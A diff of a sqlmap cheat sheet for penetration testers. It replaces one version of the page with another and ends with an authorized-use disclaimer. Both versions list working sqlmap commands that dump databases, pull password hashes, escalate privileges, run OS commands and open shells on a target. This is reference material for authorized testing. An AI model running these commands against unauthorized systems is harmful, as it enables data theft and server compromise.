@@ -1,179 +1,95 @@
-# 📌 Sqlmap Cheat Sheet for Pentesters
+# SQLMap Cheat Sheet for Penetration Testing
 
-Sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.
+This guide is for quick reference during SQL injection testing using **sqlmap**, a powerful automated tool for SQLi discovery and exploitation.
 
 ---
 
 ## 🔧 Basic Usage
 
 ```shell
-sqlmap -u "http://target.com/page.php?id=1" --batch
+# Specify a POST request with parameters
+sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'
+
+# Target specific parameter in POST/GET data
+sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
 ```
 
-- `-u`: Target URL
-- `--batch`: Non-interactive mode (default answers)
+## 🔐 Authentication & Headers
+
+```shell
+# Use cookies for authenticated sessions
+sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'
+
+# Drop Set-Cookie headers from responses
+sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie
+
+# Use a random User-Agent header
+sqlmap -u 'http://target.server.com' -r req.txt --random-agent
+```
+
+## 🎯 Targeted Requests
+
+```shell
+# Read request from Burp Suite file and target 'user' parameter
+sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
+
+# Target specific DBMS (example: Oracle)
+sqlmap -u 'http://target.server.com' -r req.txt --dbms=Oracle
+```
+
+## 🚀 Advanced Attack Options
+
+```shell
+# Increase scan intensity
+sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3
+
+# Attempt privilege escalation
+sqlmap -r ./req.txt --level=1 --risk=3 --privesc
+
+# Execute an OS command (whoami)
+sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
+
+# Dump all data with 1-second delay between requests
+sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
+```
+
+## 🧰 Useful Options
+
+| Option | Description |
+|--------|-------------|
+| `-r req.txt` | Load raw HTTP request from file (e.g., Burp Suite) |
+| `--force-ssl` | Enforce HTTPS usage |
+| `--proxy http://127.0.0.1:8080` | Route traffic through a proxy like Burp |
+| `--delay=1` | Delay between requests (seconds) |
+| `--level=1` | Controls number of tests per parameter (1-5) |
+| `--risk=3` | Risk level for tests (1-3) |
+| `--dbs` | Enumerate databases |
+| `--tables` | List tables in a database |
+| `--columns` | List columns in a table |
+| `--dump` | Dump table contents |
+| `--comments` | Extract DB comments |
+| `--hostname` | Show DB server hostname |
+| `--all` | Dump everything |
+| `--passwords` | Get DB user password hashes |
+| `--sql-shell` | Open interactive SQL shell |
+| `--os-shell` | Attempt to get OS shell |
+| `--file-write` | Upload file to server |
+| `--file-dest` | Destination path on target server |
+| `--reg-read` | Read Windows registry key |
+
+## 🎯 Exploitation Techniques
+
+Use `--technique` to specify injection types:
+
+| Code | Technique |
+|------|-----------|
+| B | Boolean-based blind |
+| E | Error-based |
+| U | Union query-based |
+| S | Stacked queries |
+| T | Time-based blind |
+| Q | Inline queries |
 
 ---
 
-## 📄 Using a Request File (Burp Suite)
-
-```shell
-sqlmap -r request.txt --batch
-```
-
-- `-r`: Use an HTTP request file captured via Burp Suite.
-
----
-
-## 📚 DB Enumeration
-
-### Current User
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --current-user --batch
-```
-
-### Current Database
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --current-db --batch
-```
-
-### List All Databases
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
-```
-
----
-
-## 📂 Table & Column Enumeration
-
-### List Tables in a Database
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables --batch
-```
-
-### List Columns in a Table
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns --batch
-```
-
----
-
-## 🧪 Dumping Data
-
-### Dump All from a Table
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --batch
-```
-
-### Dump Everything
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dump-all --batch
-```
-
----
-
-## 🧠 Advanced Options
-
-### Check if Current User is DBA
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --is-dba --batch
-```
-
-### Search for a Specific Column (e.g., flag)
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --search -C flag --batch
-```
-
----
-
-## 🧰 DBMS-Specific Examples
-
-### MySQL
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL --batch --dump
-```
-
-### PostgreSQL
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dbms=PostgreSQL --batch --dump
-```
-
-### Microsoft SQL Server
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dbms="Microsoft SQL Server" --batch --dump
-```
-
-### Oracle
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --dbms=Oracle --batch --dump
-```
-
----
-
-## 🖥️ OS Command Execution (if supported)
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
-```
-
-> Note: Only works if stacked queries or certain DBMS functions (e.g., `xp_cmdshell`) are available.
-
----
-
-## 🔐 Authentication Options
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --cookie="SESSIONID=abc123" --batch
-```
-
----
-
-## 🛠️ Technique Forcing
-
-```shell
-sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ --batch
-```
-
-- B: Boolean-based blind
-- E: Error-based
-- U: UNION-based
-- S: Stacked queries
-- T: Time-based
-- Q: Inline queries
-
----
-
-## 💡 Tips
-
-- Use `--flush-session` to clear cached data if you're modifying parameters.
-- Use `--risk=3 --level=5` for deeper tests (but more requests).
-- Use `--threads=10` to speed up scans (if the server can handle it).
-
----
-
-## 📌 Example: Oracle with Burp Request File
-
-```shell
-sqlmap -r burp_sqlmap-oracle.txt --dbms=Oracle --current-user --tables --batch
-sqlmap -r burp_sqlmap-oracle.txt -D APP_USER -T flags --dump --batch
-```
-
----
-
-## 📎 Resources
-
-- [sqlmap.org](http://sqlmap.org)
-- `sqlmap --help` (for full CLI reference)
+> ⚠️ **Disclaimer**: This page is for educational and authorized penetration testing only. Abricto Security assumes no responsibility for misuse.
